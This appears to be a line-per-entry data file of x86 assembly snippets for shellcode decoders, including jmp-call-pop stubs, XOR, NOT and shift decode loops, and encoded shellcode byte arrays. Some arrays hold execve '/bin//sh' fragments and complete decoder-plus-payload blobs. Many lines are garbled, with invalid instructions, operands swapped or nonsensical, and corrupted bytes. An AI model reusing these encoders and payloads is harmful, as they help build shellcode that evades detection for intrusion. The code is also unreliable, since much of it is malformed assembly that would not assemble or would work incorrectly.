_start :
_start :
_start : \n jmp short call_decoder
_start : \n jmp call_decoder
_start : \n jmp call_decoder
_start : \n jmp short call_decoder
_start : \n jmp short call_decoder
_start : \n jmp short call_shellcode
_start : \n jmp short call_shellcode
_start : \n jmp short call_shellcode
_start : \n jmp short enc
_start : \n jmp short var1
"add al , 0x2"
"add al , 3"
"add byte 0x02 , 0x0"
"add byte [esi] , 0x10"
"add eax , 4 \n jnz decode"
"add eax , ebx"
"add ebp , 0x2"
"add edi , 2"
"add esi , 2"
call decoder
call var0
call decoder_setup
call returnlabel
var1 : \n call [esp]
call_decoder :
call call_decoder
call_decoder : \n call [esp]
call_decoder : \n call [esp]
call_decoder : \n call [esp]
"call_decoder : dw var1 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x3 , 0x80"
call call_shellcode
call call_shellcode
call_shellcode : \n call [esp]
call_shellcode : \n call [esp]
call_shellcode : \n call function_1
call_shellcode : \n call function_1
call_shellcode : \n call [esp]
check_even_odd :
"cmp al , cl \n je short decode \n jmp short decode"
jne bl
jb xordecode \n jmp bl
"je byte [0x88] , esi \n jmp shellcode"
jne not_equal
jb execute_shellcode
common_commands : \n inc esi
port :
dec cl \n jz var0
"sub ebx , 1"
decode_loop :
call decode_pr
var0 :
"mov var0 , esp"
"add decode , 1222"
"mov decode , esp"
"mov eax , 4"
"decode : \n cmp byte [esi] , var3 \n jg lowbound \n add byte [esi] , var3 \n jmp var6"
"bl : \n mov var1 , esp"
decode : \n not byte [esi]
decode : \n not byte [esi]
"decode : \n xor byte [esi] , 0xaa"
decoded_shellcode : \n jmp var1
"mov decoder_setup , xbd"
decoder :
"mov decoder , digits"
"mov eax , 7"
decoder :
var0 :
"mov 's , 42"
"mov eax , 1222"
decoder : \n pop esi
decoder : \n pop esi
"esi : \n pop var2 \n mov var3 , edi"
enc : \n call [esp]
"encoded_shellcode : db 0xc0 , 0x31 , 0x68 , 0x50 , 0x2f , 0x2f , 0x68 , 0x73 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"encoded_shellcode : db 0x545 , 0x4a3 , 0x583 , 0x5d3 , 0x541 , 0x541 , 0x439 , 0x5d3 , 0x5d3 , 0x541 , 0x5e7 , 0x5d5 , 0x5cf , 0x411 , 0x4eb , 0x443 , 0x509 , 0x48d , 0x423 , 0x539"
"db 0x3e , 0xcd , 0x5d , 0x75 , 0x3 , 0x3 , 0xmsgvar , 0x , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"0x04 , 0x539 , 0x9d9 , 0x6c9 , 0xfc9 , 0xc49 , 0xc29 , 0x839 , 0xdf9 , 0xc49 , 0xc49 , 0x839 , 0x839 , 0xce9 , 0xc59 , 0x259 , 0x4f9 , 0xfc9 , 0x259 , 0x4e9 , 0xff9 , 0x259 , 0x4d9 , 0x1c9 , 0xa79 , 0x619 , 0x2c9 , 0x539 : dw var1 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"message db encodedshellcode \n jg ë ^~1À°1Û óªu\ GëíèÞÿÿÿ1ªÀªPªhª/ª/ªsªhªhª/ªbªiªnªªãªPªªâªSªªáª°ª ªÍªª»» , esp"
"db encodedshellcode , 0x5e , 0x5d , 0x75 , 0x3c , 0x3c , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"mov encodedshellcode , [esp]"
"db encodedshellcode , 0x5e , 0x5d , 0x75 , 0x3c , 0x3c , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"db encodedshellcode , 0xf , 0x2f , 0x68 , 0x69 , 0x31 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"mov encoder_shellcode , [esp]"
even_number :
execute_shellcode : \n jmp short var1
format equ 15
"mov var0 , jnc"
"mov var1 , get_shellcode_addr"
global _start
global _start
inc dx
inc eax
inc eax
inc ecx
inc ecx
inc edi \n inc edi
inc edi
inc edx
inc edx \n inc edx \n inc edx \n inc edx
inc esi
inc byte [esi+ shellcode]
"lea esi , [esi+6]"
"mov var1 , [esi]"
inc esi \n inc esi
inc esi \n inc esi
inc esi \n jmp short var0
inc_dec :
jmp decode
jmp short call_decoder
"mov var1 , call_shellcode"
jmp short call_shellcode
jmp short cycle
jmp short decode
jmp short decode
jmp var0
� goto
jmp short get_shellcode_addr
jmp short inc_dec
jmp short var0
"mov shellcode_section , [esp]"
jmp short var0
jz decoded_shellcode
"lea var1 , [edi+2]"
"lea edi , [esi+13]"
"mov edi , [esi]"
"lea edi , [esi]"
"mov edi , [esi]"
"lea edi , [esi+0x1]"
"lea var1 , [esi+2]"
loop var2 \n jmp short shellcode
jnz var0
dec edx \n jnz var1
loop decrypt \n jmp encrypt
loop decrypt \n jmp encrypt
dec decode \n jnz var1
loop encodedshellcode \n jmp short shellcode
loopja \n jmp short shellcode
loop encoded_shellcode \n jmp short shellcode
"mov eax , 1222"
"mov main , 1222"
"mov edi , al"
"mov al , [edi]"
"xchg byte [esi] , al"
"mov al , byte [esi]"
"mov al , byte [esi]"
"mov al , byte [esi+1+ebp]"
"mov al , cl"
"mov dl , 93"
"mov al , dl"
"mov ax , [esi]"
"mov word [edi+1+ecx] , ax"
"mov bl , 36"
"mov var1 , byte [esi+edx+2]"
"mov var1 , byte [esi]"
"mov bl , 0x7"
"mov bl , 0xff"
"mov bl , byte [eax]"
"mov bl , byte [edi+ecx]"
"mov bl , byte [edi]"
"mov bl , byte [esi+eax +1]"
"mov bl , byte [esi+eax]"
"mov bl , byte [esi+edi]"
"mov bl , [esi+edx+1]"
"mov bl , byte [esi]"
"mov bl , byte [esi+eax*1]"
"mov bl , byte [esi+eax*1+0x1]"
"mov esi+ecx+1 , byte [[]"
"mov cl , bl"
"mov bx , [esi]"
"mov eax , dl"
"mov bl , filecontents"
"mov byte [edi] , bl \n not byte [edi]"
"mov edi , byte [bl]"
"mov edx+eax , byte [bl]"
"mov byte [esi+1] , dl"
"mov esi+eax , [bl]"
"mov byte dl , dl"
"mov byte [esi+ecx] , bl"
"mov byte [esp+eax+1] , cl"
"mov byte [esp+eax+2] , bh"
"mov byte [esp+eax+3] , bl"
"mov byte [ch] , al"
"mov edx+eax , byte [bl]"
"mov [ch] , esi+edx+4"
"mov byte [esi] , 10"
"mov cl , 13"
"mov al , cl"
"mov cl , byte [eax]"
"mov cl , byte [esi+edx+3]"
"mov cl , dl"
"mov dl , esi-1"
"mov dl , byte [esi+0]"
"mov dl , [esi+12]"
"mov dl , 0x45"
"mov dl , 0xff"
"mov dl , byte [eax+1]"
"mov eax , dl"
"mov dl , esi+1"
"mov dl , byte [esi+edi+1]"
"mov dl , byte [esi]"
"mov eax , edi"
"mov ecx , ebp"
"mov edi , 0xaaaa9090"
"mov edi , [esp]"
"mov edx , esp"
"mov edi , ax"
negative : \n not dl \n inc dl
next_cycle : \n jmp short edi
"mov var1 , byte [esi]"
"mov eax , 64"
"mov notdecode , 1222"
odd_number :
pop esi
pop esi
pop esi
pop esi
"pop esi \n mov var1 , [esi]"
push shellcode
"push esi \n mov edi , esp"
"mov eax , 4"
"rol var0 , dl"
jbe cl
inc esi \n call [esp]
section .text
shellcode_length : equ $- shellcode
shellcode_section : \n jmp short shellcode
"db 0x0e , 0x3a , 0x94 , 0x12 , 0x12 , 0x12 , 0xb2 , 0x9b , 0x37 , 0xc3 , 0x52 , 0xb6 , 0x9d , 0xa2 , 0xc2 , 0x9d , 0xa4 , 0x1e , 0x9d , 0xa4 , 0xe6 , 0x9d , 0x84 , 0xfa , 0x21 , 0x49 , 0xdc , 0xf8 , 0xc3 , 0x11 , 0x7e , 0xce , 0xb3 , 0x8e , 0x14 , 0xfe , 0xf2 , 0x53 , 0x61 , 0x1f , 0x13 , 0x59 , 0x34 , 0x04 , 0xa4 , 0xa9 , 0x9d , 0xa4 , 0xe2 , 0x9d , 0xdc , 0xce , 0x9d , 0xde , 0xe3 , 0x8a , 0x35 , 0xda , 0x13 , 0x23 , 0xa3 , 0x9d , 0xab , 0xf2 , 0x13 , 0x25 , 0x9d , 0xdb , 0xea , 0x35 , 0xcc , 0xdb , 0x9d , 0xc6 , 0x9d , 0x13 , 0x28 , 0xc3 , 0x11 , 0x7e , 0x53 , 0x61 , 0x1f , 0x13 , 0x59 , 0xca , 0x32 , 0x87 , 0x08 , 0x15 , 0x8f , 0x0a , 0xcd , 0x8f , 0xf6 , 0x87 , 0x36 , 0xaa , 0x9d , 0xaa , 0xf6 , 0x13 , 0x25 , 0xb8 , 0x9d , 0x1e , 0xdd , 0x9d , 0xaa , 0xee , 0x13 , 0x25 , 0x9d , 0x16 , 0x9d , 0x13 , 0x22 , 0x9b , 0xd6 , 0xf6 , 0xf6 , 0xad , 0xad , 0xb3 , 0xab , 0xac , 0xa3 , 0x11 , 0x32 , 0xb1 , 0xb1 , 0xac , 0x9d , 0xe4 , 0x3d , 0x9f , 0xaf , 0xba , 0xc5 , 0xc4 , 0x12 , 0x12 , 0xba , 0x89 , 0x85 , 0xc4 , 0xb1 , 0xa6 , 0xba , 0xde , 0x89 , 0xf8 , 0x19 , 0x11 , 0x27 , 0x4a , 0x62 , 0x13 , 0x12 , 0x12 , 0xfb , 0x56 , 0xa6 , 0xa2 , 0xba , 0xfb , 0x92 , 0xbd , 0x12 , 0x11 , 0x27 , 0xa2 , 0xa2 , 0xa2 , 0xa2 , 0xd2 , 0xa2 , 0xd2 , 0xa2 , 0xba , 0x3c , 0x21 , 0x31 , 0x32 , 0x11 , 0x27 , 0x69 , 0xbc , 0x17 , 0xba , 0x52 , 0x7a , 0x86 , 0x59 , 0xba , 0x14 , 0x12 , 0x13 , 0x4d , 0x9b , 0x38 , 0xbc , 0xe2 , 0xa8 , 0xa9 , 0xba , 0x6b , 0x77 , 0x86 , 0xb3 , 0x11 , 0x27 , 0x97 , 0x52 , 0x86 , 0x1e , 0x11 , 0xe0 , 0x1a , 0x87 , 0x3e , 0xba , 0x02 , 0x47 , 0x74 , 0xa8 , 0x11 , 0x27 , 0xba , 0xb5 , 0xbf , 0xb6 , 0x12 , 0x9b , 0x35 , 0xa9 , 0xa9 , 0xa9 , 0xc3 , 0x08 , 0xbc , 0xe4 , 0xab , 0xa8 , 0x34 , 0x0f , 0xb8 , 0x59 , 0xd6 , 0xf6 , 0xce , 0x13 , 0x13 , 0x9f , 0xd6 , 0xf6 , 0xe2 , 0x58 , 0x12 , 0xd6 , 0xa6 , 0xa2 , 0xa8 , 0xa8 , 0xa8 , 0xd8 , 0xa8 , 0xe0 , 0xa8 , 0xa8 , 0xa5 , 0xa8 , 0xba , 0x8b , 0x5e , 0xd1 , 0x98 , 0x11 , 0x27 , 0x9b , 0x32 , 0xe0 , 0xa8 , 0xd8 , 0x11 , 0xc2 , 0xba , 0x1a , 0x99 , 0xef , 0xb2 , 0x11 , 0x27 , 0x4d , 0x02 , 0x47 , 0x74 , 0xa8 , 0xba , 0x78 , 0x67 , 0x4f , 0x6f , 0x11 , 0x27 , 0xce , 0x18 , 0x8e , 0x1c , 0x92 , 0x0d , 0x32 , 0x87 , 0x17 , 0x4d , 0xd9 , 0xe5 , 0x84 , 0xc1 , 0xbc , 0x12 , 0xa5 , 0x11 , 0x27 , 0x88 , 0x5e , 0x5d , 0x75 , 0x3c , 0x3c , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x3 , 0x80"
"0x18 , 0x38 , 0xc7 , 0x57 , 0x6f , 0x36 , 0x36 , 0x7a , 0x6f , 0x6f , 0x36 , 0x69 , 0x70 , 0x75 , 0x90 , 0xea , 0x38 , 0xd0 , 0x90 , 0xd1 , 0x71 , 0x12 , 0x5f , 0xd4 , 0x87 : dw var1 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"mov 0x31 , 0xc0 , 0x31 , 0xdb , 0x31 , 0xc9 , 0x31 , 0xd2 , 0xb2 , 0xa4 , 0xeb , 0x1f , 0x5e , 0x8d , 0x3e , 0x8a , 0x1c , 0x0f , 0x88 , 0xdf , 0x88 , 0xd0 , 0x30 , 0xd8 , 0x74 , 0x16 , 0x66 , 0x8b , 0x44 , 0x0f , 0x01 , 0x66 , 0x31 , 0xd8 , 0x66 , 0x89 , 0x07 , 0x41 , 0x8d , 0x7f , 0x02 , 0xeb , 0xe4 , 0xe8 , 0xdc , 0xff , 0xff , 0xff , 0x7d , 0x4c , 0xa6 , 0x09 , 0xfe , 0xea , 0xd8 , 0x8b , 0x9b , 0x0c , 0x5f , 0x66 , 0x30 , 0x32 , 0xb9 , 0x07 , 0xe6 , 0xb7 , 0x0f , 0x69 , 0xc2 , 0xab , 0x2b , 0xf0 , 0x3e , 0x60 , 0x6c , 0xea , 0x82 , 0xe8 , 0x63 , 0x63 , 0x72 , 0x68 , 0x34 , 0x02 , 0xeb , 0xfb , 0xba , 0xef , 0xbf , 0x66 , 0xf4 , 0x15 , 0x9e , 0xbb , 0xdd , 0xe3 , 0x73 , 0xbe , 0xf3 , 0xbb , 0x32 , 0xfa , 0xeb , 0xef , 0x58 , 0x20 , 0x24 , 0x90 , 0xe3 , 0x85 , 0x2e , 0x64 , 0xe4 , 0x27 , 0x59 , 0xe9 , 0x3f , 0xee , 0x23 , 0x6e , 0x63 , 0xf0 , 0x3a , 0x47 , 0x2d , 0x78 , 0x68 , 0x30 , 0xa5 , 0x66 , 0xe6 , 0x2f , 0x69 , 0x10 , 0x91 , 0xfa , 0x92 , 0xd5 , 0x3e , 0x11 , 0x4d , 0xf4 , 0x9c , 0x9c , 0x16 , 0x39 , 0x74 , 0xa0 , 0xc9 , 0xce , 0xd2 , 0x5b , 0x31 , 0x5c , 0x0c , 0x0f , 0xfb , 0x72 , 0x1a , 0xb6 , 0x06 , 0xbd , 0xd1 , 0x1c , 0x51 , 0xa4 , 21"
"db 0x3e , 0xcd , 0x5d , 0x96 , 0xef , 0x75 , 0x3c , 0x3c , 0x80 , 0x75 , 0x75 , 0x3c , 0x6f , 0x76 , 0x7b , 0x96 , 0xf0 , 0x5d , 0xbd , 0x18 , 0xda , 0x8d , 0x3e , 0x5d , 0x75 , 0x3c , 0x3c , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x3 , 0x80"
"0x62 , 0x60 , 0xa0 , 0x34 , 0x5e , 0x97 , 0xe6 , 0x34 , 0xd0 , 0x97 , 0xc4 , 0xb4 , 0xdc , 0xc4 , 0xc7 , 0x28 , 0x13 , 0x71 , 0xa6 , 0xc4 , 0xc3 , 0x58 , 0x16 , 0xe6 , 0x01 : dw var1 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"mov 0xbb , 0xec , 0x73 , 0xcc , 0x3f , 0x9d , 0xbb , 0x8d , 0x51 , 0xbb , 0xb5 , 0x1b , 0xbb , 0xb3 , 0x22 , 0xbb , 0xf2 , 0x79 , 0xbb , 0xae , 0x8e , 0xbb , 0xb5 , 0x61 , 0xbb , 0xb5 , 0x3d , 0xbb , 0xf2 , 0x6e , 0xbb , 0xf2 , 0x9f , 0xbb , 0xbf , 0x10 , 0xbb , 0xb4 , 0x89 , 0xcc , 0x76 , 0x2d , 0xcc , 0x1c , 0x2f , 0xbb , 0x8d , 0x91 , 0xcc , 0x76 , 0x7e , 0xcc , 0x1d , 0x92 , 0xbb , 0x8e , 0x80 , 0xcc , 0x76 , 0x7b , 0xcc , 0x1e , 0xa7 , 0xcc , 0x4f , 0x7f , 0xbb , 0xd6 , 0x2b , 0xcc , 0x32 , 0x24 , 0xcc , 0x7f , 0x37 , 0xaa , [esp]"
"mov 0xc6 , 0x02 , 0x80 , 0x01 , 0x81 , 0x03 , 0xd1 , 0x01 , 0xbe , 0x02 , 0x5f , 0x01 , 0x98 , 0x03 , 0x1c , 0x06 , 0x60 , 0x08 , 0xf6 , 0x04 , 0xc5 , 0x01 , 0x92 , 0x04 , 0x30 , 0x07 , 0x64 , 0x06 , 0x3a , 0x04 , 0x58 , 0x08 , 0x4f , 0x03 , 0x59 , 0x05 , 0xd2 , 0x06 , 0x81 , 0x08 , 0x1a , 0x04 , 0x5f , 0x07 , 0x03 , 0x08 , 0xd8 , 0x04 , 0x0c , 0x04 , 0xbb , 0xbb , act"
"db 0xeb , 0x0d , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0x80 , 0x36 , 0xaa , 0x46 , 0xe2 , 0xfa , 0xeb , 0x05 , 0xe8 , 0xee , 0xff , 0xff , 0xff , 0x9b , 0x6a , 0xfa , 0xc2 , 0x85 , 0x85 , 0xd9 , 0xc2 , 0xc2 , 0x85 , 0xc8 , 0xc3 , 0xc4 , 0x23 , 0x49 , 0xfa , 0x23 , 0x48 , 0xf9 , 0x23 , 0x4b , 0x1a , 0xa1 , 0x67 , 0x2a , 0xf , 0x2f , 0x68 , 0x69 , 0x31 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"0xf1 , 0x31 , 0x90 , 0x38 , 0x47 , 0x47 , 0x5c , 0x1b , 0x1b , 0x47 , 0x4d , 0x0b , 0x07 , 0xe7 , 0x6a , 0xb3 , 0xd9 , 0x6b , 0xb1 , 0xda , 0x68 , 0x51 , 0xbb , 0xc6 , 0x4d : db var1 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
shift_decode :
"encodedshellcode eax , var1"
"shr eax , var1"
"shr ax , var0 \n not var1"
"shr ax , var0 \n not word ax"
"shr bl , 4"
"shr dl , 1"
"shr dl , 93"
"shr eax , eax"
"mov eax , eax"
decoder : \n call [esp]
"sub ax , 13"
"sub bl , al"
"sub var1 , byte [esi]"
"sub byte [esi] , 8 \n not byte [esi]"
"sub dl , cl"
"sub dl , al \n jnz decode_pr"
"sub bx , bx"
"sub var1 , 0x7f"
"sub esp , 0x7f"
switch :
jmp even_number
"xchg byte [esi+ dbvar] , al"
"xor bl , al \n jz var2"
"xor ax , 0x539"
"xor ax , bx"
"xor ax , bx \n jnz var2"
"xor byte [esi+edx] , var1"
"xor bl , encodedshellcode"
"xor bl , var2"
"xor cl , bl \n jz 0xbb"
"xor [bl] , esi+edx"
"xor bl , var2 \n jnz short bl"
"mov byte [0x88] , esi"
"mov byte [0x97] , esi"
"xor dl , byte [esi+1]"
"xor dl , byte [esi]"
"xor byte [esi] , dl"
"xor dl , cl"
"xor byte [ch] , esi+edx"
"xor cl , 0x32 \n jz short var2"
"xor 0xaa , 0xaa \n jnz cl , [0xaa]"
"xor cl , 0xaa \n jz var1"
"xor cl , [esi+edx]"
"xor 0xbb , dl \n jz dl"
"xor eax , eax \n mov al , 0x1"
"xor eax , eax \n mov al , [esi+1]"
"xor eax , eax \n jnz ebx , ebx \n xor var2 , var2"
"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor var3 , var3"
"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor edx , edx"
"xor eax , eax \n xor ebx , ebx \n xor ecx , ecx \n xor edx , edx"
"xor ebp , ebp"
"xor ebx , ebx"
"xor ebx , ebx \n mov cl , [esi+1]"
"xor ebx , ebx \n xor edx , edx \n xor var2 , var2"
"xor ecx , ecx"
"xor ecx , ecx \n mov dl , 0x19"
"xor 0x1e , 0x1e \n mov dl , var1"
"xor ecx , ecx \n mov dl , var1"
"xor ecx , ecx \n mov dl , [esi+1]"
"xor shellcode_length , shellcode_length \n mov dl , 5"
pop eax
"mov edx , eax"
"xor edx , edx \n mul edx"
"xor ebx , ebx \n mul ebx"
"xor edi , edi \n xor eax , eax \n xor ebx , ebx \n xor edx , edx"
"xor edx , edx \n mov bl , [esi+1]"
xordecode :
